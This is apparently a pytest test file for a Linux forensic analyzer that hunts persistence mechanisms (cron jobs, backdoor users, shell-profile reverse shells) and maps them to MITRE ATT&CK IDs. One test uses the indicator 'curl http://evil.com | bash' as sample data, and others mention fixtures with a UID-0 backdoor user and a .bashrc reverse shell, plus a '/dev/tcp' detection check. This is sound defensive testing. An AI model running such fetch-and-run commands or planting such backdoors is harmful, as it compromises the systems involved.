"""Tests for the persistence hunter analyzer."""

from dataclasses import fields
from datetime import datetime

import pytest
from lft.analyzers.persistence import (
    PersistenceFinding,
    MITRE_MAPPINGS,
    PersistenceHunter,
)


class TestPersistenceFinding:
    """Test the PersistenceFinding dataclass."""

    def test_constructor(self):
        finding = PersistenceFinding(
            filepath="/etc/crontab",
            technique="Scheduled Task/Job: Cron",
            technique_id="T1053.003",
            severity="HIGH",
            description="Suspicious cron job detected",
            indicator="curl http://evil.com | bash",
        )
        assert finding.filepath == "/etc/crontab"
        assert finding.technique_id == "T1053.003"
        assert finding.severity == "HIGH"

    def test_defaults(self):
        finding = PersistenceFinding(
            filepath="/test", technique="t", technique_id="T0000",
            severity="INFO", description="d",
        )
        assert finding.indicator == ""
        assert finding.line_number == 0
        assert finding.raw_content == ""
        assert finding.hash_md5 == ""
        assert finding.hash_sha256 == ""
        assert finding.extra_info == {}
        assert finding.exported_file == ""

    def test_to_dict_keys(self):
        finding = PersistenceFinding(
            filepath="/etc/crontab",
            technique="Cron",
            technique_id="T1053.003",
            severity="HIGH",
            description="test",
        )
        d = finding.to_dict()
        assert d["Filepath"] == "/etc/crontab"
        assert d["MITRE_ATT&CK_ID"] == "T1053.003"
        assert d["Severity"] == "HIGH"
        assert "Raw_Content" in d
        assert "MD5" in d
        assert "Exported_File" in d

    def test_to_dict_truncates_raw_content(self):
        finding = PersistenceFinding(
            filepath="/test", technique="t", technique_id="T0000",
            severity="INFO", description="d",
            raw_content="A" * 2000,
        )
        d = finding.to_dict()
        assert len(d["Raw_Content"]) <= 1000

    def test_to_dict_exported_file_note(self):
        finding = PersistenceFinding(
            filepath="/test", technique="t", technique_id="T0000",
            severity="INFO", description="d",
            raw_content="B" * 500,
            exported_file="/tmp/exported.txt",
        )
        d = finding.to_dict()
        assert "exported" in d["Raw_Content"].lower() or d["Exported_File"]


class TestMitreMappings:
    """Test MITRE ATT&CK technique mappings."""

    def test_cron_mapping(self):
        assert "cron" in MITRE_MAPPINGS
        name, tid = MITRE_MAPPINGS["cron"]
        assert "T1053" in tid

    def test_authorized_keys_mapping(self):
        assert "authorized_keys" in MITRE_MAPPINGS
        name, tid = MITRE_MAPPINGS["authorized_keys"]
        assert "T1098" in tid

    def test_backdoor_user_mapping(self):
        assert "backdoor_user" in MITRE_MAPPINGS
        name, tid = MITRE_MAPPINGS["backdoor_user"]
        assert "T1136" in tid

    def test_systemd_mapping(self):
        assert "systemd" in MITRE_MAPPINGS
        name, tid = MITRE_MAPPINGS["systemd"]
        assert "T1543" in tid

    def test_all_mappings_have_two_elements(self):
        for key, val in MITRE_MAPPINGS.items():
            assert isinstance(val, tuple), f"{key} is not a tuple"
            assert len(val) == 2, f"{key} doesn't have 2 elements"
            name, tid = val
            assert tid.startswith("T"), f"{key} ID doesn't start with T"

    @pytest.mark.parametrize("technique", [
        "cron", "at_job", "timer", "authorized_keys",
        "backdoor_user", "systemd", "ld_preload",
        "pam", "sudoers", "suid", "lkm", "web_shell",
    ])
    def test_key_techniques_present(self, technique):
        assert technique in MITRE_MAPPINGS


class TestPersistenceHunterInit:
    """Test PersistenceHunter initialization."""

    def test_directory_init(self, sample_uac_dir):
        hunter = PersistenceHunter(str(sample_uac_dir))
        assert hunter.findings == []
        hunter.close()

    def test_tarball_init(self, sample_tarball):
        hunter = PersistenceHunter(str(sample_tarball))
        assert hunter.findings == []
        hunter.close()


class TestPersistenceHunterAnalysis:
    """Test PersistenceHunter analysis on synthetic data."""

    def test_hunt_finds_backdoor_user(self, sample_uac_dir):
        """The fixture has a backdoor user with UID 0 in /etc/passwd."""
        hunter = PersistenceHunter(str(sample_uac_dir))
        hunter.hunt(verbose=False)
        # Look for a finding about the backdoor user
        backdoor_findings = [
            f for f in hunter.findings
            if 'backdoor' in f.description.lower() or 'uid' in f.description.lower()
            or 'backdoor' in f.indicator.lower()
        ]
        assert len(backdoor_findings) > 0, (
            f"Expected backdoor user finding, got: "
            f"{[f.description for f in hunter.findings[:5]]}"
        )
        hunter.close()

    def test_hunt_finds_suspicious_cron(self, sample_uac_dir):
        """The fixture has a cron entry with 'curl ... | bash'."""
        hunter = PersistenceHunter(str(sample_uac_dir))
        hunter.hunt(verbose=False)
        cron_findings = [
            f for f in hunter.findings
            if 'cron' in f.technique.lower() or 'cron' in f.filepath.lower()
        ]
        assert len(cron_findings) > 0, (
            f"Expected cron finding, got: "
            f"{[f.technique for f in hunter.findings[:5]]}"
        )
        hunter.close()

    def test_hunt_finds_bashrc_backdoor(self, sample_uac_dir):
        """The fixture has a reverse shell in .bashrc."""
        hunter = PersistenceHunter(str(sample_uac_dir))
        hunter.hunt(verbose=False)
        shell_findings = [
            f for f in hunter.findings
            if 'shell' in f.technique.lower() or 'profile' in f.technique.lower()
            or 'bashrc' in f.filepath.lower() or '/dev/tcp' in f.indicator.lower()
            or 'reverse' in f.description.lower()
        ]
        assert len(shell_findings) > 0, (
            f"Expected shell profile finding, got: "
            f"{[(f.filepath, f.technique) for f in hunter.findings[:10]]}"
        )
        hunter.close()
